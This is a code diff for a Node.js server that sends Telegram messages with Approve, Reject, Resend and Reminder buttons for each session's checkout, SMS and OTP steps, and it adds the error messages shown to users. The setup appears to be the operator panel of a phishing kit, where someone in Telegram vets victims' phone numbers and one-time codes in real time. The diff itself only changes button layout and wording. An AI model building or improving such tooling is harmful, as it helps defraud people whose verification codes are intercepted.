@@ -75,26 +75,37 @@ function stripFirstLine(text) {
   return rest.replace(/^━+\n/, '').trim();
 }
 
+/* ============================================================
+   KEYBOARD — 2 columns for SMS and OTP
+   ============================================================ */
 function buildKeyboard(step, sessionId) {
-  const row = [];
-
   if (step === 'checkout') {
-    row.push(
-      { text: '✅ Approve', callback_data: `approve:checkout:${sessionId}` },
-      { text: '❌ Reject',  callback_data: `reject:checkout:${sessionId}` }
-    );
+    return {
+      inline_keyboard: [
+        [
+          { text: '✅ Approve', callback_data: `approve:checkout:${sessionId}` },
+          { text: '❌ Reject',  callback_data: `reject:checkout:${sessionId}` }
+        ]
+      ]
+    };
   }
 
   if (step === 'sms' || step === 'otp') {
-    row.push(
-      { text: '✅ Approve',  callback_data: `approve:${step}:${sessionId}` },
-      { text: '❌ Reject',   callback_data: `reject:${step}:${sessionId}` },
-      { text: '🔁 Resend',   callback_data: `resend:${step}:${sessionId}` },
-      { text: '⏰ Reminder', callback_data: `reminder:${step}:${sessionId}` }
-    );
+    return {
+      inline_keyboard: [
+        [
+          { text: '✅ Approve',  callback_data: `approve:${step}:${sessionId}` },
+          { text: '❌ Reject',   callback_data: `reject:${step}:${sessionId}` }
+        ],
+        [
+          { text: '🔁 Resend',   callback_data: `resend:${step}:${sessionId}` },
+          { text: '⏰ Reminder', callback_data: `reminder:${step}:${sessionId}` }
+        ]
+      ]
+    };
   }
 
-  return { inline_keyboard: [row] };
+  return { inline_keyboard: [] };
 }
 
 async function sendTelegramWithButtons(text, sessionId, step) {
@@ -402,10 +413,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       if (session.telegramMessageId) {
         await editTelegramMessage(session.telegramMessageId, newText, {
-          inline_keyboard: [[
-            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
-            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
-          ]]
+          inline_keyboard: [
+            [
+              { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
+              { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+            ]
+          ]
         });
       }
 
@@ -433,11 +446,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       if (session.telegramMessageId) {
         await editTelegramMessage(session.telegramMessageId, newText, {
-          inline_keyboard: [[
-            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
-            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` },
-            { text: '🔁 Resend',  callback_data: `resend:${step}:${sessionId}` }
-          ]]
+          inline_keyboard: [
+            [
+              { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
+              { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+            ],
+            [
+              { text: '🔁 Resend', callback_data: `resend:${step}:${sessionId}` }
+            ]
+          ]
         });
       }
 
@@ -454,6 +471,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       if (step === 'checkout') {
         session.userMessage = 'Incorrect number. Kindly check your number and try again.';
+      } else if (step === 'sms') {
+        session.userMessage = 'Your details mismatch. Kindly ensure your details are correct, check your details and try again.';
+      } else if (step === 'otp') {
+        session.userMessage = 'Incorrect code. Please try again from the beginning.';
       } else {
         session.userMessage = 'Rejected. Please try again.';
       }
